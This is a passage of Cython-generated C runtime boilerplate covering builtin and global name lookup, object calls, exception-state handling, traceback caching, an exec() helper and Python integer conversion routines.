    PyObject* result = __Pyx_PyObject_GetAttrStr(__pyx_b, name);
    if (unlikely(!result)) {
        PyErr_Format(PyExc_NameError,
#if PY_MAJOR_VERSION >= 3
            "name '%U' is not defined", name);
#else
            "name '%.200s' is not defined", PyString_AS_STRING(name));
#endif
    }
    return result;
}

/* PyDictVersioning */
#if CYTHON_USE_DICT_VERSIONS && CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PY_UINT64_T __Pyx_get_tp_dict_version(PyObject *obj) {
    PyObject *dict = Py_TYPE(obj)->tp_dict;
    return likely(dict) ? __PYX_GET_DICT_VERSION(dict) : 0;
}
static CYTHON_INLINE PY_UINT64_T __Pyx_get_object_dict_version(PyObject *obj) {
    PyObject **dictptr = NULL;
    Py_ssize_t offset = Py_TYPE(obj)->tp_dictoffset;
    if (offset) {
#if CYTHON_COMPILING_IN_CPYTHON
        dictptr = (likely(offset > 0)) ? (PyObject **) ((char *)obj + offset) : _PyObject_GetDictPtr(obj);
#else
        dictptr = _PyObject_GetDictPtr(obj);
#endif
    }
    return (dictptr && *dictptr) ? __PYX_GET_DICT_VERSION(*dictptr) : 0;
}
static CYTHON_INLINE int __Pyx_object_dict_version_matches(PyObject* obj, PY_UINT64_T tp_dict_version, PY_UINT64_T obj_dict_version) {
    PyObject *dict = Py_TYPE(obj)->tp_dict;
    if (unlikely(!dict) || unlikely(tp_dict_version != __PYX_GET_DICT_VERSION(dict)))
        return 0;
    return obj_dict_version == __Pyx_get_object_dict_version(obj);
}
#endif

/* GetModuleGlobalName */
#if CYTHON_USE_DICT_VERSIONS
static PyObject *__Pyx__GetModuleGlobalName(PyObject *name, PY_UINT64_T *dict_version, PyObject **dict_cached_value)
#else
static CYTHON_INLINE PyObject *__Pyx__GetModuleGlobalName(PyObject *name)
#endif
{
    PyObject *result;
#if !CYTHON_AVOID_BORROWED_REFS
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030500A1
    result = _PyDict_GetItem_KnownHash(__pyx_d, name, ((PyASCIIObject *) name)->hash);
    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)
    if (likely(result)) {
        return __Pyx_NewRef(result);
    } else if (unlikely(PyErr_Occurred())) {
        return NULL;
    }
#else
    result = PyDict_GetItem(__pyx_d, name);
    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)
    if (likely(result)) {
        return __Pyx_NewRef(result);
    }
#endif
#else
    result = PyObject_GetItem(__pyx_d, name);
    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)
    if (likely(result)) {
        return __Pyx_NewRef(result);
    }
    PyErr_Clear();
#endif
    return __Pyx_GetBuiltinName(name);
}

/* PyObjectCall */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_Call(PyObject *func, PyObject *arg, PyObject *kw) {
    PyObject *result;
    ternaryfunc call = Py_TYPE(func)->tp_call;
    if (unlikely(!call))
        return PyObject_Call(func, arg, kw);
    if (unlikely(Py_EnterRecursiveCall((char*)" while calling a Python object")))
        return NULL;
    result = (*call)(func, arg, kw);
    Py_LeaveRecursiveCall();
    if (unlikely(!result) && unlikely(!PyErr_Occurred())) {
        PyErr_SetString(
            PyExc_SystemError,
            "NULL result without error in PyObject_Call");
    }
    return result;
}
#endif

/* PyErrFetchRestore */
#if CYTHON_FAST_THREAD_STATE
static CYTHON_INLINE void __Pyx_ErrRestoreInState(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb) {
    PyObject *tmp_type, *tmp_value, *tmp_tb;
    tmp_type = tstate->curexc_type;
    tmp_value = tstate->curexc_value;
    tmp_tb = tstate->curexc_traceback;
    tstate->curexc_type = type;
    tstate->curexc_value = value;
    tstate->curexc_traceback = tb;
    Py_XDECREF(tmp_type);
    Py_XDECREF(tmp_value);
    Py_XDECREF(tmp_tb);
}
static CYTHON_INLINE void __Pyx_ErrFetchInState(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb) {
    *type = tstate->curexc_type;
    *value = tstate->curexc_value;
    *tb = tstate->curexc_traceback;
    tstate->curexc_type = 0;
    tstate->curexc_value = 0;
    tstate->curexc_traceback = 0;
}
#endif

/* CLineInTraceback */
#ifndef CYTHON_CLINE_IN_TRACEBACK
static int __Pyx_CLineForTraceback(CYTHON_NCP_UNUSED PyThreadState *tstate, int c_line) {
    PyObject *use_cline;
    PyObject *ptype, *pvalue, *ptraceback;
#if CYTHON_COMPILING_IN_CPYTHON
    PyObject **cython_runtime_dict;
#endif
    if (unlikely(!__pyx_cython_runtime)) {
        return c_line;
    }
    __Pyx_ErrFetchInState(tstate, &ptype, &pvalue, &ptraceback);
#if CYTHON_COMPILING_IN_CPYTHON
    cython_runtime_dict = _PyObject_GetDictPtr(__pyx_cython_runtime);
    if (likely(cython_runtime_dict)) {
        __PYX_PY_DICT_LOOKUP_IF_MODIFIED(
            use_cline, *cython_runtime_dict,
            __Pyx_PyDict_GetItemStr(*cython_runtime_dict, __pyx_n_s_cline_in_traceback))
    } else
#endif
    {
      PyObject *use_cline_obj = __Pyx_PyObject_GetAttrStr(__pyx_cython_runtime, __pyx_n_s_cline_in_traceback);
      if (use_cline_obj) {
        use_cline = PyObject_Not(use_cline_obj) ? Py_False : Py_True;
        Py_DECREF(use_cline_obj);
      } else {
        PyErr_Clear();
        use_cline = NULL;
      }
    }
    if (!use_cline) {
        c_line = 0;
        (void) PyObject_SetAttr(__pyx_cython_runtime, __pyx_n_s_cline_in_traceback, Py_False);
    }
    else if (use_cline == Py_False || (use_cline != Py_True && PyObject_Not(use_cline) != 0)) {
        c_line = 0;
    }
    __Pyx_ErrRestoreInState(tstate, ptype, pvalue, ptraceback);
    return c_line;
}
#endif

/* CodeObjectCache */
static int __pyx_bisect_code_objects(__Pyx_CodeObjectCacheEntry* entries, int count, int code_line) {
    int start = 0, mid = 0, end = count - 1;
    if (end >= 0 && code_line > entries[end].code_line) {
        return count;
    }
    while (start < end) {
        mid = start + (end - start) / 2;
        if (code_line < entries[mid].code_line) {
            end = mid;
        } else if (code_line > entries[mid].code_line) {
             start = mid + 1;
        } else {
            return mid;
        }
    }
    if (code_line <= entries[mid].code_line) {
        return mid;
    } else {
        return mid + 1;
    }
}
static PyCodeObject *__pyx_find_code_object(int code_line) {
    PyCodeObject* code_object;
    int pos;
    if (unlikely(!code_line) || unlikely(!__pyx_code_cache.entries)) {
        return NULL;
    }
    pos = __pyx_bisect_code_objects(__pyx_code_cache.entries, __pyx_code_cache.count, code_line);
    if (unlikely(pos >= __pyx_code_cache.count) || unlikely(__pyx_code_cache.entries[pos].code_line != code_line)) {
        return NULL;
    }
    code_object = __pyx_code_cache.entries[pos].code_object;
    Py_INCREF(code_object);
    return code_object;
}
static void __pyx_insert_code_object(int code_line, PyCodeObject* code_object) {
    int pos, i;
    __Pyx_CodeObjectCacheEntry* entries = __pyx_code_cache.entries;
    if (unlikely(!code_line)) {
        return;
    }
    if (unlikely(!entries)) {
        entries = (__Pyx_CodeObjectCacheEntry*)PyMem_Malloc(64*sizeof(__Pyx_CodeObjectCacheEntry));
        if (likely(entries)) {
            __pyx_code_cache.entries = entries;
            __pyx_code_cache.max_count = 64;
            __pyx_code_cache.count = 1;
            entries[0].code_line = code_line;
            entries[0].code_object = code_object;
            Py_INCREF(code_object);
        }
        return;
    }
    pos = __pyx_bisect_code_objects(__pyx_code_cache.entries, __pyx_code_cache.count, code_line);
    if ((pos < __pyx_code_cache.count) && unlikely(__pyx_code_cache.entries[pos].code_line == code_line)) {
        PyCodeObject* tmp = entries[pos].code_object;
        entries[pos].code_object = code_object;
        Py_DECREF(tmp);
        return;
    }
    if (__pyx_code_cache.count == __pyx_code_cache.max_count) {
        int new_max = __pyx_code_cache.max_count + 64;
        entries = (__Pyx_CodeObjectCacheEntry*)PyMem_Realloc(
            __pyx_code_cache.entries, ((size_t)new_max) * sizeof(__Pyx_CodeObjectCacheEntry));
        if (unlikely(!entries)) {
            return;
        }
        __pyx_code_cache.entries = entries;
        __pyx_code_cache.max_count = new_max;
    }
    for (i=__pyx_code_cache.count; i>pos; i--) {
        entries[i] = entries[i-1];
    }
    entries[pos].code_line = code_line;
    entries[pos].code_object = code_object;
    __pyx_code_cache.count++;
    Py_INCREF(code_object);
}

/* AddTraceback */
#include "compile.h"
#include "frameobject.h"
#include "traceback.h"
#if PY_VERSION_HEX >= 0x030b00a6
  #ifndef Py_BUILD_CORE
    #define Py_BUILD_CORE 1
  #endif
  #include "internal/pycore_frame.h"
#endif
static PyCodeObject* __Pyx_CreateCodeObjectForTraceback(
            const char *funcname, int c_line,
            int py_line, const char *filename) {
    PyCodeObject *py_code = NULL;
    PyObject *py_funcname = NULL;
    #if PY_MAJOR_VERSION < 3
    PyObject *py_srcfile = NULL;
    py_srcfile = PyString_FromString(filename);
    if (!py_srcfile) goto bad;
    #endif
    if (c_line) {
        #if PY_MAJOR_VERSION < 3
        py_funcname = PyString_FromFormat( "%s (%s:%d)", funcname, __pyx_cfilenm, c_line);
        if (!py_funcname) goto bad;
        #else
        py_funcname = PyUnicode_FromFormat( "%s (%s:%d)", funcname, __pyx_cfilenm, c_line);
        if (!py_funcname) goto bad;
        funcname = PyUnicode_AsUTF8(py_funcname);
        if (!funcname) goto bad;
        #endif
    }
    else {
        #if PY_MAJOR_VERSION < 3
        py_funcname = PyString_FromString(funcname);
        if (!py_funcname) goto bad;
        #endif
    }
    #if PY_MAJOR_VERSION < 3
    py_code = __Pyx_PyCode_New(
        0,
        0,
        0,
        0,
        0,
        __pyx_empty_bytes, /*PyObject *code,*/
        __pyx_empty_tuple, /*PyObject *consts,*/
        __pyx_empty_tuple, /*PyObject *names,*/
        __pyx_empty_tuple, /*PyObject *varnames,*/
        __pyx_empty_tuple, /*PyObject *freevars,*/
        __pyx_empty_tuple, /*PyObject *cellvars,*/
        py_srcfile,   /*PyObject *filename,*/
        py_funcname,  /*PyObject *name,*/
        py_line,
        __pyx_empty_bytes  /*PyObject *lnotab*/
    );
    Py_DECREF(py_srcfile);
    #else
    py_code = PyCode_NewEmpty(filename, funcname, py_line);
    #endif
    Py_XDECREF(py_funcname);  // XDECREF since it's only set on Py3 if cline
    return py_code;
bad:
    Py_XDECREF(py_funcname);
    #if PY_MAJOR_VERSION < 3
    Py_XDECREF(py_srcfile);
    #endif
    return NULL;
}
static void __Pyx_AddTraceback(const char *funcname, int c_line,
                               int py_line, const char *filename) {
    PyCodeObject *py_code = 0;
    PyFrameObject *py_frame = 0;
    PyThreadState *tstate = __Pyx_PyThreadState_Current;
    PyObject *ptype, *pvalue, *ptraceback;
    if (c_line) {
        c_line = __Pyx_CLineForTraceback(tstate, c_line);
    }
    py_code = __pyx_find_code_object(c_line ? -c_line : py_line);
    if (!py_code) {
        __Pyx_ErrFetchInState(tstate, &ptype, &pvalue, &ptraceback);
        py_code = __Pyx_CreateCodeObjectForTraceback(
            funcname, c_line, py_line, filename);
        if (!py_code) {
            /* If the code object creation fails, then we should clear the
               fetched exception references and propagate the new exception */
            Py_XDECREF(ptype);
            Py_XDECREF(pvalue);
            Py_XDECREF(ptraceback);
            goto bad;
        }
        __Pyx_ErrRestoreInState(tstate, ptype, pvalue, ptraceback);
        __pyx_insert_code_object(c_line ? -c_line : py_line, py_code);
    }
    py_frame = PyFrame_New(
        tstate,            /*PyThreadState *tstate,*/
        py_code,           /*PyCodeObject *code,*/
        __pyx_d,    /*PyObject *globals,*/
        0                  /*PyObject *locals*/
    );
    if (!py_frame) goto bad;
    __Pyx_PyFrame_SetLineNumber(py_frame, py_line);
    PyTraceBack_Here(py_frame);
bad:
    Py_XDECREF(py_code);
    Py_XDECREF(py_frame);
}

/* PyExec */
static CYTHON_INLINE PyObject* __Pyx_PyExec2(PyObject* o, PyObject* globals) {
    return __Pyx_PyExec3(o, globals, NULL);
}
static PyObject* __Pyx_PyExec3(PyObject* o, PyObject* globals, PyObject* locals) {
    PyObject* result;
    PyObject* s = 0;
    char *code = 0;
    if (!globals || globals == Py_None) {
        globals = __pyx_d;
    } else if (!PyDict_Check(globals)) {
        PyErr_Format(PyExc_TypeError, "exec() arg 2 must be a dict, not %.200s",
                     Py_TYPE(globals)->tp_name);
        goto bad;
    }
    if (!locals || locals == Py_None) {
        locals = globals;
    }
    if (__Pyx_PyDict_GetItemStr(globals, __pyx_n_s_builtins) == NULL) {
        if (PyDict_SetItem(globals, __pyx_n_s_builtins, PyEval_GetBuiltins()) < 0)
            goto bad;
    }
    if (PyCode_Check(o)) {
        if (__Pyx_PyCode_HasFreeVars((PyCodeObject *)o)) {
            PyErr_SetString(PyExc_TypeError,
                "code object passed to exec() may not contain free variables");
            goto bad;
        }
        #if PY_VERSION_HEX < 0x030200B1 || (CYTHON_COMPILING_IN_PYPY && PYPY_VERSION_NUM < 0x07030400)
        result = PyEval_EvalCode((PyCodeObject *)o, globals, locals);
        #else
        result = PyEval_EvalCode(o, globals, locals);
        #endif
    } else {
        PyCompilerFlags cf;
        cf.cf_flags = 0;
#if PY_VERSION_HEX >= 0x030800A3
        cf.cf_feature_version = PY_MINOR_VERSION;
#endif
        if (PyUnicode_Check(o)) {
            cf.cf_flags = PyCF_SOURCE_IS_UTF8;
            s = PyUnicode_AsUTF8String(o);
            if (!s) goto bad;
            o = s;
        #if PY_MAJOR_VERSION >= 3
        } else if (!PyBytes_Check(o)) {
        #else
        } else if (!PyString_Check(o)) {
        #endif
            PyErr_Format(PyExc_TypeError,
                "exec: arg 1 must be string, bytes or code object, got %.200s",
                Py_TYPE(o)->tp_name);
            goto bad;
        }
        #if PY_MAJOR_VERSION >= 3
        code = PyBytes_AS_STRING(o);
        #else
        code = PyString_AS_STRING(o);
        #endif
        if (PyEval_MergeCompilerFlags(&cf)) {
            result = PyRun_StringFlags(code, Py_file_input, globals, locals, &cf);
        } else {
            result = PyRun_String(code, Py_file_input, globals, locals);
        }
        Py_XDECREF(s);
    }
    return result;
bad:
    Py_XDECREF(s);
    return 0;
}

/* GetAttr */
static CYTHON_INLINE PyObject *__Pyx_GetAttr(PyObject *o, PyObject *n) {
#if CYTHON_USE_TYPE_SLOTS
#if PY_MAJOR_VERSION >= 3
    if (likely(PyUnicode_Check(n)))
#else
    if (likely(PyString_Check(n)))
#endif
        return __Pyx_PyObject_GetAttrStr(o, n);
#endif
    return PyObject_GetAttr(o, n);
}

/* Globals */
static PyObject* __Pyx_Globals(void) {
    Py_ssize_t i;
    PyObject *names;
    PyObject *globals = __pyx_d;
    Py_INCREF(globals);
    names = PyObject_Dir(__pyx_m);
    if (!names)
        goto bad;
    for (i = PyList_GET_SIZE(names)-1; i >= 0; i--) {
#if CYTHON_COMPILING_IN_PYPY
        PyObject* name = PySequence_ITEM(names, i);
        if (!name)
            goto bad;
#else
        PyObject* name = PyList_GET_ITEM(names, i);
#endif
        if (!PyDict_Contains(globals, name)) {
            PyObject* value = __Pyx_GetAttr(__pyx_m, name);
            if (!value) {
#if CYTHON_COMPILING_IN_PYPY
                Py_DECREF(name);
#endif
                goto bad;
            }
            if (PyDict_SetItem(globals, name, value) < 0) {
#if CYTHON_COMPILING_IN_PYPY
                Py_DECREF(name);
#endif
                Py_DECREF(value);
                goto bad;
            }
        }
#if CYTHON_COMPILING_IN_PYPY
        Py_DECREF(name);
#endif
    }
    Py_DECREF(names);
    return globals;
bad:
    Py_XDECREF(names);
    Py_XDECREF(globals);
    return NULL;
}

/* CIntToPy */
static CYTHON_INLINE PyObject* __Pyx_PyInt_From_long(long value) {
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wconversion"
#endif
    const long neg_one = (long) -1, const_zero = (long) 0;
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic pop
#endif
    const int is_unsigned = neg_one > const_zero;
    if (is_unsigned) {
        if (sizeof(long) < sizeof(long)) {
            return PyInt_FromLong((long) value);
        } else if (sizeof(long) <= sizeof(unsigned long)) {
            return PyLong_FromUnsignedLong((unsigned long) value);
#ifdef HAVE_LONG_LONG
        } else if (sizeof(long) <= sizeof(unsigned PY_LONG_LONG)) {
            return PyLong_FromUnsignedLongLong((unsigned PY_LONG_LONG) value);
#endif
        }
    } else {
        if (sizeof(long) <= sizeof(long)) {
            return PyInt_FromLong((long) value);
#ifdef HAVE_LONG_LONG
        } else if (sizeof(long) <= sizeof(PY_LONG_LONG)) {
            return PyLong_FromLongLong((PY_LONG_LONG) value);
#endif
        }
    }
    {
        int one = 1; int little = (int)*(unsigned char *)&one;
        unsigned char *bytes = (unsigned char *)&value;
        return _PyLong_FromByteArray(bytes, sizeof(long),
                                     little, !is_unsigned);
    }
}

/* CIntFromPyVerify */
#define __PYX_VERIFY_RETURN_INT(target_type, func_type, func_value)\
    __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, 0)
#define __PYX_VERIFY_RETURN_INT_EXC(target_type, func_type, func_value)\
    __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, 1)
#define __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, exc)\
    {\
        func_type value = func_value;\
        if (sizeof(target_type) < sizeof(func_type)) {\
            if (unlikely(value != (func_type) (target_type) value)) {\
                func_type zero = 0;\
                if (exc && unlikely(value == (func_type)-1 && PyErr_Occurred()))\
                    return (target_type) -1;\
                if (is_unsigned && unlikely(value < zero))\
                    goto raise_neg_overflow;\
                else\
                    goto raise_overflow;\
            }\
        }\
        return (target_type) value;\
    }

/* CIntFromPy */
static CYTHON_INLINE long __Pyx_PyInt_As_long(PyObject *x) {
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wconversion"
#endif
    const long neg_one = (long) -1, const_zero = (long) 0;
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic pop
#endif
    const int is_unsigned = neg_one > const_zero;
#if PY_MAJOR_VERSION < 3
    if (likely(PyInt_Check(x))) {
        if (sizeof(long) < sizeof(long)) {
            __PYX_VERIFY_RETURN_INT(long, long, PyInt_AS_LONG(x))
        } else {
            long val = PyInt_AS_LONG(x);
            if (is_unsigned && unlikely(val < 0)) {
                goto raise_neg_overflow;
            }
            return (long) val;
        }
    } else
#endif
    if (likely(PyLong_Check(x))) {
        if (is_unsigned) {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (long) 0;
                case  1: __PYX_VERIFY_RETURN_INT(long, digit, digits[0])
                case 2:
                    if (8 * sizeof(long) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) >= 2 * PyLong_SHIFT) {
                            return (long) (((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(long) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) >= 3 * PyLong_SHIFT) {
                            return (long) (((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(long) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) >= 4 * PyLong_SHIFT) {
                            return (long) (((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));
                        }
                    }
                    break;
            }
#endif
#if CYTHON_COMPILING_IN_CPYTHON
            if (unlikely(Py_SIZE(x) < 0)) {
                goto raise_neg_overflow;
            }
#else
            {
                int result = PyObject_RichCompareBool(x, Py_False, Py_LT);
                if (unlikely(result < 0))
                    return (long) -1;
                if (unlikely(result == 1))
                    goto raise_neg_overflow;
            }
#endif
            if (sizeof(long) <= sizeof(unsigned long)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, unsigned long, PyLong_AsUnsignedLong(x))
#ifdef HAVE_LONG_LONG
            } else if (sizeof(long) <= sizeof(unsigned PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, unsigned PY_LONG_LONG, PyLong_AsUnsignedLongLong(x))
#endif
            }
        } else {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (long) 0;
                case -1: __PYX_VERIFY_RETURN_INT(long, sdigit, (sdigit) (-(sdigit)digits[0]))
                case  1: __PYX_VERIFY_RETURN_INT(long,  digit, +digits[0])
                case -2:
                    if (8 * sizeof(long) - 1 > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                            return (long) (((long)-1)*(((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case 2:
                    if (8 * sizeof(long) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                            return (long) ((((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case -3:
                    if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                            return (long) (((long)-1)*(((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(long) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                            return (long) ((((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case -4:
                    if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT) {
                            return (long) (((long)-1)*(((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(long) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT) {
                            return (long) ((((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
            }
#endif
            if (sizeof(long) <= sizeof(long)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, long, PyLong_AsLong(x))
#ifdef HAVE_LONG_LONG
            } else if (sizeof(long) <= sizeof(PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, PY_LONG_LONG, PyLong_AsLongLong(x))
#endif
            }
        }
        {
#if CYTHON_COMPILING_IN_PYPY && !defined(_PyLong_AsByteArray)
            PyErr_SetString(PyExc_RuntimeError,
                            "_PyLong_AsByteArray() not available in PyPy, cannot convert large numbers");
#else
            long val;
            PyObject *v = __Pyx_PyNumber_IntOrLong(x);
 #if PY_MAJOR_VERSION < 3
            if (likely(v) && !PyLong_Check(v)) {
                PyObject *tmp = v;
                v = PyNumber_Long(tmp);
                Py_DECREF(tmp);
            }
 #endif
            if (likely(v)) {
                int one = 1; int is_little = (int)*(unsigned char *)&one;
                unsigned char *bytes = (unsigned char *)&val;
                int ret = _PyLong_AsByteArray((PyLongObject *)v,
                                              bytes, sizeof(val),
                                              is_little, !is_unsigned);
                Py_DECREF(v);
                if (likely(!ret))
                    return val;
            }
#endif
            return (long) -1;
        }
    } else {
        long val;
        PyObject *tmp = __Pyx_PyNumber_IntOrLong(x);
        if (!tmp) return (long) -1;
        val = __Pyx_PyInt_As_long(tmp);
        Py_DECREF(tmp);
        return val;
    }
raise_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "value too large to convert to long");
    return (long) -1;
raise_neg_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "can't convert negative value to long");
    return (long) -1;
}

/* CIntFromPy */
static CYTHON_INLINE int __Pyx_PyInt_As_int(PyObject *x) {
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wconversion"
#endif
    const int neg_one = (int) -1, const_zero = (int) 0;
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic pop
#endif
    const int is_unsigned = neg_one > const_zero;
#if PY_MAJOR_VERSION < 3
    if (likely(PyInt_Check(x))) {
        if (sizeof(int) < sizeof(long)) {
            __PYX_VERIFY_RETURN_INT(int, long, PyInt_AS_LONG(x))
        } else {
            long val = PyInt_AS_LONG(x);
            if (is_unsigned && unlikely(val < 0)) {
                goto raise_neg_overflow;
            }
            return (int) val;
        }
    } else
#endif
    if (likely(PyLong_Check(x))) {
        if (is_unsigned) {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (int) 0;
                case  1: __PYX_VERIFY_RETURN_INT(int, digit, digits[0])
                case 2:
                    if (8 * sizeof(int) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) >= 2 * PyLong_SHIFT) {
                            return (int) (((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(int) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) >= 3 * PyLong_SHIFT) {
                            return (int) (((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(int) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) >= 4 * PyLong_SHIFT) {
                            return (int) (((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));
                        }
                    }
                    break;
            }
#endif
#if CYTHON_COMPILING_IN_CPYTHON
            if (unlikely(Py_SIZE(x) < 0)) {
                goto raise_neg_overflow;
            }
#else
            {
                int result = PyObject_RichCompareBool(x, Py_False, Py_LT);
                if (unlikely(result < 0))
                    return (int) -1;
                if (unlikely(result == 1))
                    goto raise_neg_overflow;
            }
#endif
            if (sizeof(int) <= sizeof(unsigned long)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, unsigned long, PyLong_AsUnsignedLong(x))
